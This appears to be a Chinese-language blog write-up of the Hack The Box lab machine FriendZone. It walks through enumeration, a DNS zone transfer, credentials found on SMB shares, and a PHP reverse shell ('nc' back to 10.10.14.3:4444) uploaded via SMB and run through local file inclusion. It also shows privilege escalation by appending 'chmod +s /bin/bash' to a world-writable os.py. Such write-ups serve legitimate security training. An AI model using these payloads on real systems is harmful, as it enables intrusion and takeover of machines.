@@ -1,0 +1,908 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>FriendZone - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - FriendZone靶场信息                                                                                                            靶场类型">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FriendZone - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/09/20/Hackthebox%20-%20FriendZone/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - FriendZone靶场信息                                                                                                            靶场类型">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/20/Hackthebox%20-%20FriendZone/1685a985-17e0-44e9-bd04-a66535d31e57.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/20/Hackthebox%20-%20FriendZone/b0a91def-39ba-4606-a732-8ed9239ee972.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/20/Hackthebox%20-%20FriendZone/9a965834-fcb3-4978-962c-2f4e60dbed20.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/20/Hackthebox%20-%20FriendZone/33882849-1ab7-46b1-8438-122572d089ce.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/20/Hackthebox%20-%20FriendZone/dfc2d5f6-36c9-457e-9a31-3873c5e44667.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/20/Hackthebox%20-%20FriendZone/fa0b0178-107c-47af-8f93-38c738a1892d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/20/Hackthebox%20-%20FriendZone/212b0b2e-9469-4660-a090-c08b0dae4a17.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/20/Hackthebox%20-%20FriendZone/6a033764-ad5a-41e1-94a6-dfaad1d72b43.png">
+<meta property="article:published_time" content="2022-09-20T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-05-20T01:50:17.857Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/09/20/Hackthebox%20-%20FriendZone/1685a985-17e0-44e9-bd04-a66535d31e57.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">FriendZone - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">FriendZone - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-09-20T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-09-20
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-FriendZone"><span class="post-toc-number">1.</span> <span class="post-toc-text">Hackthebox - FriendZone</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-number">2.</span> <span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-number">3.</span> <span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-number">4.</span> <span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">Http</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Ftp"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">Ftp</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Samba"><span class="post-toc-number">4.4.</span> <span class="post-toc-text">Samba</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-number">5.</span> <span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-number">6.</span> <span class="post-toc-text">权限提升</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#User"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">User</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Root"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">Root</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox - FriendZone"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">FriendZone - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-09-20 19:38:36" datetime="2022-09-20T11:38:36.000Z"  itemprop="datePublished">2022-09-20</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-FriendZone"><a href="#Hackthebox-FriendZone" class="headerlink" title="Hackthebox - FriendZone"></a>Hackthebox - FriendZone</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/09/20/Hackthebox%20-%20FriendZone/1685a985-17e0-44e9-bd04-a66535d31e57.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/09/20/Hackthebox%20-%20FriendZone/b0a91def-39ba-4606-a732-8ed9239ee972.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.123
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-09 13:14 CST
+Nmap scan report for 10.10.10.123
+Host is up (0.27s latency).
+Not shown: 65528 closed tcp ports (reset)
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 3.0.3
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
+|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
+|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
+53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
+80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Friend Zone Escape software
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+443/tcp open  ssl/http    Apache httpd 2.4.29
+| tls-alpn: 
+|_  http/1.1
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
+| Not valid before: 2018-10-05T21:02:30
+|_Not valid after:  2018-11-04T21:02:30
+|_http-title: 404 Not Found
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=9/9%OT=21%CT=1%CU=36793%PV=Y%DS=2%DC=T%G=Y%TM=631ACC10
+OS:%P=aarch64-unknown-linux-gnu)SEQ(SP=101%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=
+OS:A)OPS(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M5
+OS:39ST11NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=712
+OS:0)ECN(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S
+OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=
+OS:)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%
+OS:A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%
+OS:DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=
+OS:40%CD=S)
+
+Network Distance: 2 hops
+Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -1h00m00s, deviation: 1h43m54s, median: -1s
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: friendzone
+|   NetBIOS computer name: FRIENDZONE\x00
+|   Domain name: \x00
+|   FQDN: friendzone
+|_  System time: 2022-09-09T08:15:47+03:00
+| smb2-time: 
+|   date: 2022-09-09T05:15:49
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+
+TRACEROUTE (using port 3306/tcp)
+HOP RTT       ADDRESS
+1   277.35 ms 10.10.14.1
+2   277.61 ms 10.10.10.123
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 60.57 seconds
+</code></pre>
+<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/09/20/Hackthebox%20-%20FriendZone/9a965834-fcb3-4978-962c-2f4e60dbed20.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>就一张静态图片，肯定不在这里了</p>
+<h2 id="Ftp"><a href="#Ftp" class="headerlink" title="Ftp"></a>Ftp</h2><pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# ftp 10.10.10.123
+Connected to 10.10.10.123.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.123:root): anonymous
+331 Please specify the password.
+Password: 
+530 Login incorrect.
+ftp: Login failed
+</code></pre>
+<p>本台不允许 ftp 匿名登陆</p>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# searchsploit vsftpd 3.0.3
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                            |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+vsftpd 3.0.3 - Remote Denial of Service                                                                                                                                                                   | multiple/remote/49719.py
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre>
+<p>Exploit-DB 也只找到一个远程DDOS的漏洞，没什么实际意义</p>
+<h2 id="Samba"><a href="#Samba" class="headerlink" title="Samba"></a>Samba</h2><pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# smbmap -H 10.10.10.123
+[+] Guest session       IP: 10.10.10.123:445    Name: 10.10.10.123                                      
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
+        general                                                 READ ONLY       FriendZone Samba Server Files
+        Development                                             READ, WRITE     FriendZone Samba Server Files
+        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
+</code></pre>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# smbclient --list 10.10.10.123 -U &quot;&quot;  
+Password for [WORKGROUP\]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        Files           Disk      FriendZone Samba Server Files /etc/Files
+        general         Disk      FriendZone Samba Server Files
+        Development     Disk      FriendZone Samba Server Files
+        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            FRIENDZONE
+</code></pre>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# nmap -p 445 --script=smb-enum-shares 10.10.10.123
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-20 09:50 CST
+Nmap scan report for 10.10.10.123
+Host is up (1.2s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: guest
+|   \\10.10.10.123\Development: 
+|     Type: STYPE_DISKTREE
+|     Comment: FriendZone Samba Server Files
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\etc\Development
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.10.123\Files: 
+|     Type: STYPE_DISKTREE
+|     Comment: FriendZone Samba Server Files /etc/Files
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\etc\hole
+|     Anonymous access: &lt;none&gt;
+|     Current user access: &lt;none&gt;
+|   \\10.10.10.123\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (FriendZone server (Samba, Ubuntu))
+|     Users: 1
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.10.123\general: 
+|     Type: STYPE_DISKTREE
+|     Comment: FriendZone Samba Server Files
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\etc\general
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.10.123\print$: 
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\var\lib\samba\printers
+|     Anonymous access: &lt;none&gt;
+|_    Current user access: &lt;none&gt;
+
+Nmap done: 1 IP address (1 host up) scanned in 95.19 seconds
+</code></pre>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# smbclient -N \\\\10.10.10.123\\Development
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Tue Sep 20 09:51:26 2022
+  ..                                  D        0  Tue Sep 13 22:56:24 2022
+
+                3545824 blocks of size 1024. 1658488 blocks available
+</code></pre>
+<p>四大常用指令挨个执行一遍，拿到的信息越多越好</p>
+<p>Development 文件夹是空的，看看另一个有读取权限的文件夹</p>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# smbclient -N \\\\10.10.10.123\\general
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Thu Jan 17 04:10:51 2019
+  ..                                  D        0  Tue Sep 13 22:56:24 2022
+  creds.txt                           N       57  Wed Oct 10 07:52:42 2018
+
+                3545824 blocks of size 1024. 1658484 blocks available
+</code></pre>
+<p>这边有一个 creds.txt 文件，读取看一下</p>
+<pre><code class="bash">creds for the admin THING:
+
+admin:WORKWORKHhallelujah@#
+</code></pre>
+<p>似乎是一个账号密码</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>我们回到 Http 页面，会看到有一个邮箱 <a href="mailto:&#x69;&#110;&#x66;&#111;&#x40;&#102;&#114;&#x69;&#x65;&#110;&#x64;&#122;&#x6f;&#110;&#101;&#x70;&#111;&#114;&#x74;&#97;&#108;&#x2e;&#x72;&#101;&#x64;">&#x69;&#110;&#x66;&#111;&#x40;&#102;&#114;&#x69;&#x65;&#110;&#x64;&#122;&#x6f;&#110;&#101;&#x70;&#111;&#114;&#x74;&#97;&#108;&#x2e;&#x72;&#101;&#x64;</a></p>
+<p>既然是域名邮箱，那按照常理来说是会存在这个域名的</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/09/20/Hackthebox%20-%20FriendZone/33882849-1ab7-46b1-8438-122572d089ce.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>查看了一下证书，发现确实存在域名，但是是 friendzone.red，去添加一个 hosts 解析</p>
+<pre><code class="bash">echo 10.10.10.123 friendzone.red &gt;&gt; /etc/hosts
+</code></pre>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# dig axfr friendzone.red @10.10.10.123
+
+; &lt;&lt;&gt;&gt; DiG 9.18.1-1-Debian &lt;&lt;&gt;&gt; axfr friendzone.red @10.10.10.123
+;; global options: +cmd
+friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
+friendzone.red.         604800  IN      AAAA    ::1
+friendzone.red.         604800  IN      NS      localhost.
+friendzone.red.         604800  IN      A       127.0.0.1
+administrator1.friendzone.red. 604800 IN A      127.0.0.1
+hr.friendzone.red.      604800  IN      A       127.0.0.1
+uploads.friendzone.red. 604800  IN      A       127.0.0.1
+friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
+;; Query time: 1439 msec
+;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
+;; WHEN: Tue Sep 20 10:09:07 CST 2022
+;; XFR size: 8 records (messages 1, bytes 289)
+</code></pre>
+<p>枚举域名信息，发现了三个子域名</p>
+<pre><code class="bash">administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red
+</code></pre>
+<p>都添加到 hosts</p>
+<p><a href="https://administrator1.friendzone.red/" target="_blank" rel="noopener">https://administrator1.friendzone.red/</a> 访问后发现是一个登陆页面</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/09/20/Hackthebox%20-%20FriendZone/dfc2d5f6-36c9-457e-9a31-3873c5e44667.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>使用我们的账号密码进行登录</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/09/20/Hackthebox%20-%20FriendZone/fa0b0178-107c-47af-8f93-38c738a1892d.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>登陆成功，让我们访问 &#x2F;dashboard.php</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/09/20/Hackthebox%20-%20FriendZone/212b0b2e-9469-4660-a090-c08b0dae4a17.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>大概意思是说，这是一个用于朋友圈的智能照片脚本，但是这是一个初级的 php 开发人员写的代码，然后这个脚本还没经过测试，所以有一个参数被遗忘了，输入这个参数可以现实图片，默认是 image_id&#x3D;a.jpg&amp;pagename&#x3D;timestamp</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/09/20/Hackthebox%20-%20FriendZone/6a033764-ad5a-41e1-94a6-dfaad1d72b43.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>看到这参数构成，感觉存在 LFI（本地文件包含），然后在之前的 Development 处，感觉有点不对，一个可读写的地址却没有内容，应该是给我们上传的点。然后我们也知道它的绝对路径，去尝试上传到 Development，再去 LFI 读取试试</p>
+<pre><code class="bash">\\10.10.10.123\Development: 
+|     Type: STYPE_DISKTREE
+|     Comment: FriendZone Samba Server Files
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\etc\Development
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+</code></pre>
+<pre><code class="bash">&lt;?php
+system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 4444 &gt;/tmp/f&#39;);
+?&gt;
+</code></pre>
+<p>把 shell 写入到 php 文件，然后去上传</p>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# smbclient //10.10.10.123/development -U &quot;&quot;
+Password for [WORKGROUP\]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; put shell.php 
+putting file shell.php as \shell.php (0.1 kb/s) (average 0.1 kb/s)
+</code></pre>
+<p>然后去包含试试</p>
+<pre><code class="bash">nc -nvlp 4444
+</code></pre>
+<pre><code class="bash">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/shell
+</code></pre>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# nc -nvlp 4444                                    
+listening on [any] 4444 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.10.10.123] 39570
+/bin/sh: 0: can&#39;t access tty; job control turned off
+$ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;;
+www-data@FriendZone:/var/www/admin$ whoami&amp;&amp;id
+whoami&amp;&amp;id
+www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>成功获得 shel</p>
+<pre><code class="bash">www-data@FriendZone:/home/friend$ cat user.txt
+cat user.txt
+a4977797fce2cc139c86af2adc340a29
+</code></pre>
+<p>成功拿到 user 权限的 flag 文件</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><pre><code class="bash">www-data@FriendZone:/var/www$ ls
+ls
+admin       friendzoneportal       html             uploads
+friendzone  friendzoneportaladmin  mysql_data.conf
+www-data@FriendZone:/var/www$ cat mysql_data.conf
+cat mysql_data.conf
+for development process this is the mysql creds for user friend
+
+db_user=friend
+
+db_pass=Agpyu12!0.213$
+
+db_name=FZ
+</code></pre>
+<p>在登入后的目录找到了一个 mysql_data.conf 文件，里面包含了一些凭证</p>
+<pre><code class="bash">ww-data@FriendZone:/var/www$ cat /etc/passwd|grep bash
+cat /etc/passwd|grep bash
+root:x:0:0:root:/root:/bin/bash
+friend:x:1000:1000:friend,,,:/home/friend:/bin/bash
+</code></pre>
+<p>可以看到当前也有这个用户，去尝试 ssh 登陆试试</p>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# ssh friend@10.10.10.123
+The authenticity of host &#39;10.10.10.123 (10.10.10.123)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:ERMyoo9aM0mxdTvIh0kooJS+m3GwJr6Q51AG9/gTYx4.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;10.10.10.123&#39; (ED25519) to the list of known hosts.
+friend@10.10.10.123&#39;s password: 
+Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+You have mail.
+Last login: Thu Jan 24 01:20:15 2019 from 10.10.14.3
+friend@FriendZone:~$ whoami&amp;&amp;id
+friend
+uid=1000(friend) gid=1000(friend) groups=1000(friend),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
+</code></pre>
+<p>登入成功</p>
+<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>使用 pspy64 跑一下</p>
+<pre><code class="bash">2022/09/20 05:44:01 CMD: UID=0    PID=1417   | /bin/sh -c /opt/server_admin/reporter.py 
+2022/09/20 05:44:01 CMD: UID=0    PID=1416   | /bin/sh -c /opt/server_admin/reporter.py
+</code></pre>
+<p>发现有一个脚本 &#x2F;opt&#x2F;server_admin&#x2F;reporter.py 一直在运行</p>
+<pre><code class="bash">friend@FriendZone:~$ ls -la /opt/server_admin/reporter.py
+-rwxr--r-- 1 root root 424 Jan 16  2019 /opt/server_admin/reporter.py
+</code></pre>
+<p>并且还是 root 权限的</p>
+<pre><code class="bash">friend@FriendZone:~$ cat /opt/server_admin/reporter.py
+#!/usr/bin/python
+
+import os
+
+to_address = &quot;admin1@friendzone.com&quot;
+from_address = &quot;admin2@friendzone.com&quot;
+
+print &quot;[+] Trying to send email to %s&quot;%to_address
+
+#command = &#39;&#39;&#39; mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass &quot;PAPAP&quot;&#39;&#39;&#39;
+
+#os.system(command)
+
+# I need to edit the script later
+# Sam ~ python developer
+</code></pre>
+<p>我们没有写入权限，但是它会导入一个 os 库，咱们去查看一下是否有权限</p>
+<pre><code class="bash">friend@FriendZone:/usr/lib/python2.7$ ls -la|grep os.py
+-rwxrwxrwx  1 root   root    25910 Jan 15  2019 os.py
+</code></pre>
+<p>咱们是有写入权限的，那就写入一段恶意程序就好了</p>
+<pre><code class="bash">echo &quot;system(&#39;chmod +s /bin/bash&#39;)&quot; &gt;&gt; os.py
+</code></pre>
